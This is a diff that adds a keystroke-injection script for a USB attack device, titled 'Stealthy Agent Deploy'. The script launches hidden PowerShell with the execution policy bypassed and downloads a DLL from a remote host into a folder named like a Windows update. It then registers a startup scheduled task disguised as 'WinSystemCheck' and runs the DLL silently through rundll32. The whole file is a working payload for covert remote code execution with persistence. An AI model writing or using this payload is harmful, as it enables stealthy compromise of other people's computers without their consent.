@@ -1,0 +1,21 @@
+REM =========================================
+REM USB Army Knife - Stealthy Agent Deploy
+REM =========================================
+REM Silent deployment without UAC prompt
+REM Uses current user privileges only
+REM =========================================
+
+DELAY 2000
+
+REM Open Run dialog
+GUI r
+DELAY 500
+
+REM Launch PowerShell hidden
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& {
+ENTER
+DELAY 300
+
+REM Download and setup in one line
+STRING try { $d='$env:APPDATA\WinUpdate'; mkdir $d -Force | Out-Null; iwr 'http://4.3.2.1:8080/download?filename=/agent/PortableApp.dll' -OutFile '$d\sys.dll'; $t=New-ScheduledTaskAction -Execute 'rundll32' -Argument '$d\sys.dll Open32 vid=303A pid=1001'; $tr=New-ScheduledTaskTrigger -AtStartup; Register-ScheduledTask -TaskName 'WinSystemCheck' -Action $t -Trigger $tr -Force; Start-Process 'rundll32' -ArgumentList '$d\sys.dll','Open32','vid=303A','pid=1001' -WindowStyle Hidden } catch {} }"
+ENTER
